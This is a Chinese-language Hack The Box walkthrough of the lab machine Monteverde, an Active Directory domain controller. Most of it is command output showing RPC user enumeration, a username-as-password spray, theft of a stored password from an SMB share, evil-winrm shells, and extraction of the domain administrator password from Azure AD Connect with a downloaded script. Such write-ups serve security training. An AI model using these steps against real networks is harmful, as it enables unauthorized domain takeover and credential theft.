---
title: HTB-Monteverde Wirteup
date: 2026-08-26T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - SMB
  - RPC
  - 密码喷射
---
## Nmap 探测

使用 Nmap 探测存活的端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ sudo nmap --min-rate 10000 -p- 10.129.228.111 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-25 21:46 -0400
Nmap scan report for 10.129.228.111
Host is up (0.093s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49696/tcp open  unknown
49750/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
```

将端口提取出来做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696,49750
```

对存活的端口进行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49696,49750  10.129.228.111
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-25 21:49 -0400
Nmap scan report for 10.129.228.111
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-26 01:49:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49750/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: -45s
| smb2-time:
|   date: 2026-08-26T01:50:09
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.50 seconds
```

看扫描的结果，开放了 winrm、smb、ldap，是个标准的域控制器。

将暴露出来的域名解析至 `/etc/hosts`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ sudo bash -c 'echo "10.129.228.111 MEGABANK.LOCAL" >> /etc/hosts'
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ tail -n 1 /etc/hosts
10.129.228.111 MEGABANK.LOCAL
```

## RPC 探索

使用 rpcclient 枚举 users，枚举出来一堆用户名。

`AAD_987d7f2f57d2` 是 Azure AD Connect 同步账号。是 AAD 在安装时自动生成的服务账号。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ sudo rpcclient -U '' -N 10.129.228.111 -c 'enumdomusers'
[sudo] password for kali:
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

使用随机用户与空用户尝试访问 SMB 共享文件，无结果。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ nxc smb 10.129.228.111 -u 'enil' -p '' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\enil: STATUS_LOGON_FAILURE
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ nxc smb 10.129.228.111 -u '' -p '' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\:
SMB         10.129.228.111  445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

## 密码喷射

提取 rpcclient 扫描到的用户名，保存为一个字典。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ rpcclient -U '' -N 10.129.228.111 -c 'enumdomusers' | awk -F '[][]' '{print $2}'
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ vim Users/users
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ cat Users/users
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

使用 GetNPUsers 看看能不能暴露出启动 no-pre 的用户，结果并没有。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ GetNPUsers.py MEGABANK.LOCAL/ -dc-ip 10.129.228.111 -usersfile Users/users
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

使用 nxc 尝试爆破用户，账号密码一一对应，看看有没有人把账号和密码设置为同一个。

爆破出来 `SABatchJobs` 的账号密码是同一个。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ nxc smb 10.129.228.111 -u Users/users -p Users/users --continue-on-success --no-bruteforce
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:svc-ata STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:svc-bexec STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:svc-netapp STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:roleary STATUS_LOGON_FAILURE
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:smorgan STATUS_LOGON_FAILURE
```

## SMB 探索

查看 `SABatchJobs` 的 SMB 共享目录，有两个自定义目录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ nxc smb 10.129.228.111 -u 'SABatchJobs' -p 'SABatchJobs' --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.129.228.111  445    MONTEVERDE       users$          READsmb
```

`azure_uploads` 中没东西，将 `users$` 中的内容下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde/smb_users$]
└─$ smbclient //10.129.228.111/users$ -U 'SABatchJobs%SABatchJobs' -W MEGABANK.LOCAL
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \mhope\azure.xml of size 1212 as mhope/azure.xml (2.7 KiloBytes/sec) (average 2.7 KiloBytes/sec)
smb: \> ^C
┌──(kali㉿kali)-[~/Work/Kali/Monteverde/smb_users$]
└─$ ls -liah
total 24K
2783013 drwxrwxr-x 6 kali kali 4.0K Aug 25 23:02 .
2772224 drwxrwxr-x 5 kali kali 4.0K Aug 25 23:01 ..
2783016 drwxrwxr-x 2 kali kali 4.0K Aug 25 23:02 dgalanos
2783017 drwxrwxr-x 2 kali kali 4.0K Aug 25 23:02 mhope
2783020 drwxrwxr-x 2 kali kali 4.0K Aug 25 23:02 roleary
2783021 drwxrwxr-x 2 kali kali 4.0K Aug 25 23:02 smorgan
┌──(kali㉿kali)-[~/Work/Kali/Monteverde/smb_users$]
└─$ tree
.
├── dgalanos
├── mhope
│   └── azure.xml
├── roleary
└── smorgan

5 directories, 1 file
```

查看 `azure.xml` 的内容，发现 `mhope` 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde/smb_users$]
└─$ cat mhope/azure.xml
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>                                                                                                                                             
```

保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ vim Users/mhope
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ cat Users/mhope
mhope:4n0therD4y@n0th3r$
```

检查一下 `mhope` 账户的权限，可以登录 winrm。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ nxc smb 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ nxc winrm 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ nxc ldap 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```

登录 `mhope` 拿到 user flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> dir


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/25/2026   6:40 PM             34 user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
d7c38efb27bdba905c0e1b466abcca05
```

## 提权至 administrator

枚举 `mhope`，它属于 `Azure Admins`。

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   8/25/2026 8:04:54 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.

```

枚举 `Azure Admins`，发现其中包含 `Administrator`。

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> net group "Azure Admins"
Group name     Azure Admins
Comment

Members

-------------------------------------------------------------------------------
AAD_987d7f2f57d2         Administrator            mhope
The command completed successfully.
```

```bash

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

继续枚举的过程中发现了 `Microsoft Azure AD Sync`。

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync> dir


    Directory: C:\Program Files\Microsoft Azure AD Sync


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:53 PM                BackupData
d-----         1/2/2020   2:53 PM                Bin
d-----         1/2/2020   2:53 PM                Data
d-----         1/2/2020   2:53 PM                Extensions
d-----         1/2/2020   2:56 PM                MaData
d-----         1/2/2020   2:53 PM                UIShell

```

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync> gci Data                                                                                                                  
                                                                                                                                                                                    
                                                                                                                                                                                    
    Directory: C:\Program Files\Microsoft Azure AD Sync\Data                                                                                                                        
                                                                                                                                                                                    
                                                                                                                                                                                    
Mode                LastWriteTime         Length Name                                                                                                                               
----                -------------         ------ ----                                                                                                                               
-a----        8/31/2018   4:41 PM          71066 mv.dsml
```

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync> gci Bin                                                                                                                   
                                                                                                                                                                                    
                                                                                                                                                                                    
    Directory: C:\Program Files\Microsoft Azure AD Sync\Bin                                                                                                                         
                                                                                                                                                                                    
                                                                                                                                                                                    
Mode                LastWriteTime         Length Name                                                                                                                               
----                -------------         ------ ---- 
...
...
-a----        8/31/2018   4:54 PM         335744 mcrypt.dll
...
...
```

创建一个工作目录

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync> mkdir c:\programdata\apps


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/25/2026   8:21 PM                apps

```

将刚刚找到的文件复制到工作目录。

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Data> cp mv.dsml c:\programdata\apps\mv.dsml
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Data> cd ..\Bin
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> cp mcrypt.dll c:\programdata\apps\mcrypt.dll

```

```bash
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/31/2018   4:54 PM         335744 mcrypt.dll
-a----        8/31/2018   4:41 PM          71066 mv.dsml
```

下载 `decrypt.ps1`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ wget https://raw.githubusercontent.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/main/decrypt.ps1
--2026-08-25 23:37:42--  https://raw.githubusercontent.com/CloudyKhan/Azure-AD-Connect-Credential-Extractor/main/decrypt.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 198.18.0.52
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|198.18.0.52|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4718 (4.6K) [text/plain]
Saving to: ‘decrypt.ps1’

decrypt.ps1                                  100%[==============================================================================================>]   4.61K  --.-KB/s    in 0.009s

2026-08-25 23:37:42 (527 KB/s) - ‘decrypt.ps1’ saved [4718/4718]
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ ls -liah decrypt.ps1
2783026 -rw-rw-r-- 1 kali kali 4.7K Aug 25 23:37 decrypt.ps1
```

将 `decrypt.ps1` 上传至工作目录。

```bash
*Evil-WinRM* PS C:\programdata\apps> upload decrypt.ps1
                                        
Info: Uploading /home/kali/Work/Kali/Monteverde/decrypt.ps1 to C:\programdata\apps\decrypt.ps1
                                        
Data: 6288 bytes of 6288 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata\apps> dir


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/25/2026   8:37 PM           4718 decrypt.ps1
-a----        8/31/2018   4:54 PM         335744 mcrypt.dll
-a----        8/31/2018   4:41 PM          71066 mv.dsml
```

执行 `decrypt.ps1` 得到 `administrator` 的密码。

```bash
*Evil-WinRM* PS C:\programdata\apps> .\decrypt.ps1
Attempting connection: Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync;Integrated Security=True
Error connecting to SQL database. Trying next...
Exception Message: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
Attempting connection: Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True
Connection successful!
Loading mcrypt.dll from: C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

登录得到 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Monteverde]
└─$ evil-winrm -i 10.129.228.111 -u administrator -p 'd0m@in4dminyeah!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
2b1f5dd425ad02f423d70ea1d02022e8
```
